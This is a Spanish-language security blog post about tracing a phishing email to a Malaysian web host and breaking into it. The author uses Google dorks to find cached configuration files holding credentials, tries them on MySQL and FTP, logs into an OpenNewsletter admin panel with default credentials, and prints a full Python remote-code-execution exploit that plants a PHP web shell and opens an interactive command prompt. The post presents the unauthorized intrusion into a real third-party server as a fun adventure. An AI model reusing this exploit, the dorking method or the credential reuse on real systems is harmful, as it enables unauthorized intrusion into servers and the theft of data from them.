
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Del Spam a La Intrucion - Security Signal</title>
  <meta name="author" content="q3rv0 - hdbreaker">

  
  <meta name="description" content="by [Q]3rv[0]PrologoHacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/16/del-spam-la-intrucion/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Security Signal</a></h1>
  
    <h2>Looking for signs of insecurity...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Del Spam a La Intrucion</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-16T09:55:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:55 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.andibauer.at/wp-content/uploads/2014/10/antispam.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.andibauer.at/wp-content/uploads/2014/10/antispam.jpg" height="360" width="640" /></a></div><div style="text-align: right;"><br /><b>by [Q]3rv[0]</b></div><h2 style="text-align: center;"><b>Prologo</b></h2>Hacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede encontrarse&nbspenvuelto&nbspen&nbspalguna&nbspaventurita que te alegre el dia o no, en este caso mas que nada fue un poco de diversion. <br /><br />En fin, mientras leia los subject de los correos me pare en uno que decia: “Your account has ben blocked”. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/pZT4QvO.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/pZT4QvO.png" height="368" width="640" /></a></div><div style="text-align: center;"><br /></div>Era un mail “supuestamente” eviado desde blockchain, pero como no tenia idea que servicio estaba prestando al publico me fui directamente a la url del sitio.  <br /><br /><a href="https://blockchain.info/">https://blockchain.info/</a> <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2F6W0PB.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2F6W0PB.png" height="256" width="640" /></a></div><div style="text-align: center;"><br /></div>La verdad es que nunca me habia logueado en la aplicacion (segun recuerdo), es mas no tengo una cuenta referenciada a este tipo de servicios en general. <br /><br />Al instante y era obvio deduje que se trataba de un caso de phishing, asi que sin dudarlo segui el enlace acortado por goo.gl para afirmar lo antes predicho.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/9b6q9pg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/9b6q9pg.png" height="260" width="640" /></a></div><div style="text-align: center;"><br /></div>Por desgracia el path del fake no se encontraba, asi que por curiosidad quize seguir por mi parte para cersiorarme de si habia sido movido a otra ruta o es mas, para ver si lograba captar otros tipos de fraudes montados en el mismo hosting, pero…<br /><br /><b>como hiba a saber eso?</b><br /><br /><div style="text-align: center;"><h2><b>Un poco de Google Hacking</b></h2></div>Lo primero que hice fue arrancar a jugar con goo*, buscando diversas extenciones de ficheros, hasta que di con algo interesante.  <br /><br /><span style="color: red;">site:klsicci.com.my ext:txt</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/3KBiyMd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/3KBiyMd.png" height="416" width="640" /></a></div><div style="text-align: center;"><br /></div>Archivos de configuracion en texto plano!, lamentablemente al pedirlos no se encontraban mas en la ruta, pero si google los tenia, habria que negociar con el.<br /><br /><span style="color: red;">cache:http://klsicci.com.my/admintest1/config/klsiccic4.txt</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/CN3KSrM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/CN3KSrM.png" height="486" width="640" /></a></div><div style="text-align: center;"><br /></div>Aunque las credenciales podian ser viejas o con suerte, quizas, seguian en uso, no perdia nada con probar.  Trate de establer una conexion por mysql pero me nego el acceso, lo mas probable es que solo admitia conexiones desde localhost o bien mediante una lista de ips habilitadas.  <br /><br />Ya que conocia el user a travez del path /home/klsiccic/ informacion que habia obtenido de los ficheros cacheados, intente loguearme por ftp mediante el password de la db (Me he encontrado con muchos hostings que usan pass global para diferentes servicios), pero esta vez el ftp me reboto.  <br /><br />Todavia faltaba mucho por analizar, asi que segui probando con goog*.  Queria un acceso rapido, entonces pense que podria estar cacheada la webshell del atacante, si es que realmente habia usado una para obtener acceso. <br /><br />Luego de persistir con un par de strings <br /><br /><span style="color: red;">site:klsicci.com.my &amp;&amp; inurl:shell</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/TSNZpb8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/TSNZpb8.png" height="464" width="640" /></a></div><div style="text-align: center;"><br /></div>Di con el objetivo, pero nuevamente el 404.  Por un lado me incitaba a seguir buscando ya que tenia el title de la webshell que podria ser la herramienta del spammer. <br /><br />Hasta ahora no queria cersiorarme por completo hasta estar seguro de que fuera el autor del echo, tal vez la webshell podria pertenecer a otro intruder que nada tenia que ver con el scam.  <br /><br />Largue otra busqueda.  <br /><br /><span style="color: red;">site:klsicci.com.my &amp;&amp; intitle:"=[ 1n73ct10n privat shell ]="</span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/hq8hxbf.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/hq8hxbf.png" height="530" width="640" /></a></div><div style="text-align: center;"><br /></div>Y esta vez tenia un lindo historial, pero todos apuntaban a la misma url fallida.  Aprovechando la lista obtenida, encuentro entre los path que se le pasaban como parametro a la ex shell, un dir de nombre /opennews.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/6fRzOJr.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/6fRzOJr.png" height="280" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7za4QMt.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7za4QMt.png" height="394" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Opennewsletter es una aplicacion open-source para administrar listas de mails.<b>&nbsp;</b><br /><div style="text-align: left;"><div style="text-align: center;"><h2><b>OpenBUGletter</b></h2></div></div>Ravisando en exploit-db encuentro un reporte de multiples vulnerabilidades para las versiones &lt;=2.*. <br />Una de ellas y por cierto la mas critica hablaba de un RCE en la plataforma.  <br /><br /><a href="http://www.exploit-db.com/exploits/2981/">http://www.exploit-db.com/exploits/2981/</a><br /><br />Para ser aprovechado requieria de acceso a la administracion, investigando un poco en el source de opennews el cual lo obtuve de la siguiente web.  <br /><br /><a href="http://www.sourcexref.com/xref/opennewsletter/nav.html">http://www.sourcexref.com/xref/opennewsletter/nav.html</a><br /><br />Veo que las credenciales del admin son tomadas desde config.php y el user, pass por defecto es <b>admin:admin</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/0hWTNj4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/0hWTNj4.png" height="404" width="640" /></a></div><div style="text-align: center;"><br /></div>Por suerte el fichero no habia sido retocado y pude obtener acceso. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/6PRAemn.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/6PRAemn.png" height="302" width="640" /></a></div><div style="text-align: center;"><br /></div>Por razones que desconocia el exploit no lograba darme una shell en el sistema, asi que me puse a leer el codigo para ver donde se daba el bug, mirando en subscribers.php se puede ver como se abre el fichero data.dat y se ingresa el contenido de la variable <b>$_POST['email']</b> sin sanitizar.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/lbJNGtc.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/lbJNGtc.png" height="640" width="474" /></a></div><div style="text-align: center;"><br /></div><br />En settings.php se permite renombrar el mismo a travez de la variable <b>$_POST['db_file']</b> que al igual que la anterior no posee ningun tipo de filtro seguro. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/CXxwXJ8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/CXxwXJ8.png" height="276" width="640" /></a></div><div style="text-align: center;"><br /></div>Ahora que ya tenia una idea de como inyectar codigo, lo unico que quedaba era incrustar un payload en data.dat y este a su vez renombrarlo a *.php, mirando nuevamente el exploit me doy cuenta que para ingresar el codigo hace una peticion a <b>subscribe.php</b> (fichero que no existe en esta version de opennews (2.5.1)), ademas del pasaje de parametros por GET.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/b36Mm54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/b36Mm54.png" height="106" width="640" /></a></div><div style="text-align: center;"><br /></div>Asi que decidi codear el mio propio para realizar la explotacion.  <br /><br /><pre class="brush: py">#!/usr/bin/env python<br /># Description: Opennewsletter remote code execution exploit<br /># Version tested: 2.5.1<br /># Author: q3rv0<br /><br />import urllib2<br />import urllib<br />import re<br /><br />class opennews_exploit:<br /><br />    def __init__(self, host):<br />        self.host=host<br />        cookies=urllib2.HTTPCookieProcessor()<br />        opener=urllib2.build_opener(cookies)<br />        urllib2.install_opener(opener)<br /><br />    def postSend(self, parametros, path):<br />        self.headers={"User-Agent":"Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0"}<br />        self.parametros=urllib.urlencode(parametros)<br />        self.path=path<br />        self.post=urllib2.Request(self.host+self.path, self.parametros, headers=self.headers)<br />        return urllib2.urlopen(self.post)<br /><br />    def getOldDbFile(self):<br />        self.get=urllib2.urlopen(self.host+"settings.php").read()<br />        self.name=re.findall("name=old_db_file value=([\w\.\-_]+)&gt;", self.get)<br />        return self.name[0]<br /><br />    def verifyShell(self, path):<br />        try:<br />            self.path=path<br />            self.code=urllib2.urlopen(self.host+self.path)<br />            return self.code.getcode()<br />        except:<br />            pass<br /><br />target="http://pwnedhost.com/opennews/"<br />shell="shell.php"<br />user="admin"<br />passwd="admin"<br />admin_name="Your Name"<br />admin_email="you@domain.com"<br />charset="UTF-8"<br />site_url="http://www.yourwebsite.com"<br />opennews_directory="/"<br />payload=""<br /><br />rce=opennews_exploit(target)<br /><br />def get_shell(shell):<br />    print "[*] Obteniendo la shell :)\n"<br />    while True:<br />        command=raw_input("$~: ")<br />        print "\n"+rce.postSend({"exec":command}, shell).read()<br /><br />if rce.verifyShell(shell)==200:<br />    get_shell(shell)<br /><br />else:<br />    print "\n[*] Logueando...\n"<br />    rce.postSend({"username":user, "password":passwd}, "index.php?action=login")<br />    print "[*] Insertando el payload...\n"<br />    rce.postSend({"email":payload}, "subscribers.php?action=add")<br />    print "[*] Renombrando la shell...\n"<br />    rce.postSend({"admin_username":user, "admin_password":passwd, "admin_name":admin_name, "admin_email":admin_email, "charset":charset, "site_url":site_url, "opennewsletter_dir":opennews_directory, "old_db_file":rce.getOldDbFile(), "db_file":shell, "action":"update"}, "settings.php")<br />    get_shell(shell)<br /><br /></pre>(Cabe decir que el codigo del exploit es a modo de POC, solo fue testeado en la version 2.5.1, podria no funcionar en versiones anteriores.)<br /><br /><b>run exploit</b> <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/45SiCdg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/45SiCdg.png" height="176" width="640" /></a></div><div style="text-align: center;"><br /></div>Listo! ya estaba dentro.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2tssG3F.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2tssG3F.png" height="320" width="640" /></a></div><div style="text-align: center;"><br /></div><h2 style="text-align: center;"> Buscando rastros del scam.</h2><br />Luego de darle vueltas durante un rato, entrar y salir de directorios, darle a find como loco, no pude dar con el phishing, muchas veces las aventuras nunca terminan como uno quiere, eso terminaba por confirmarme de que el admin se habia encargado de el. Pero por otra parte encontre ciertos ficheros que comprometian aun mas al spammer/intruder.  <br /><br />El pequeño arsenal del defacer. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7Ri8TTI.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7Ri8TTI.png" height="290" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Ojala les haya gustado esta Hacknecdota.<br /><br /><div style="text-align: right;">Saludos! </div></div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>

      




<time class='entry-date' datetime='2015-01-16T09:55:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:55 am</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/16/del-spam-la-intrucion/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/16/del-spam-la-intrucion/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/01/16/sqli-en-qr-scanner/" title="Previous Post: SQLi en QR Scanner">&laquo; SQLi en QR Scanner</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/01/17/tomando-el-control-de-una-camara-axis-i/" title="Next Post: Tomando El Control De Una Camara AXIS (I)">Tomando El Control De Una Camara AXIS (I) &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - q3rv0 - hdbreaker -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
